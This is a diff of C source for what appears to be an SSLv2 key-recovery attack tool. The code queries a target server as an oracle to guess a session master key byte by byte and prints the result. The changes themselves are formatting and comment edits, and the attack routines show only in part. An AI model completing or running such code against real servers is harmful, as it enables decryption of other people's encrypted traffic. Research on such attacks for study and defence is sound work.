@@ -257,7 +257,7 @@ void send_master_key_guess(SSL *s,
 }
 
 /*
- * Receives the ServerVerify message from the server
+ * Analyzes a received ServerVerify message from the server
  * and returns 1 if the master key guess was correct
  * or 0 otherwise.
  */
@@ -374,7 +374,7 @@ SSL* oracle_test_key(char *hostaddress,
     assert(ssl2_enc_init(ssl, 1) == 1);
 	ssl2_read_from_socket(ssl);
 	printf("Reading done\n");
-	
+
 	return ssl;
 }
 
@@ -449,9 +449,11 @@ int main(int argc, char **argv)
     memset(guess_array, 0, keysize*2); // Array full of zeroes, we guess the bytes one by one
     unsigned char *master_key_guess = guess_array;
 
-	for(int current_byte = keysize - 1; current_byte >= 0; current_byte--) {
+	for (int current_byte = keysize - 1; current_byte >= 0; current_byte--)
+	{
 		// Establish connection
 		SSL *ssl = oracle_test_key(argv[1], ++master_key_guess, current_byte, encrypted_key, 256);
+
 		// Get last byte
 		printf("Guessing master key byte %d...\n", current_byte);
 		res = guess_master_key_byte(ssl, &master_key_guess[keysize - 1]);
@@ -465,9 +467,10 @@ int main(int argc, char **argv)
 		SSL_CTX_free(ssl->ctx);
 		SSL_free(ssl);
 	}
-	
+
 	printf("Guessed key is: ");
-	for(int i = 0; i < keysize; i++) {
+	for(int i = 0; i < keysize; i++)
+	{
 		printf("%02X", master_key_guess[i]);
 	}
 	printf("\n");
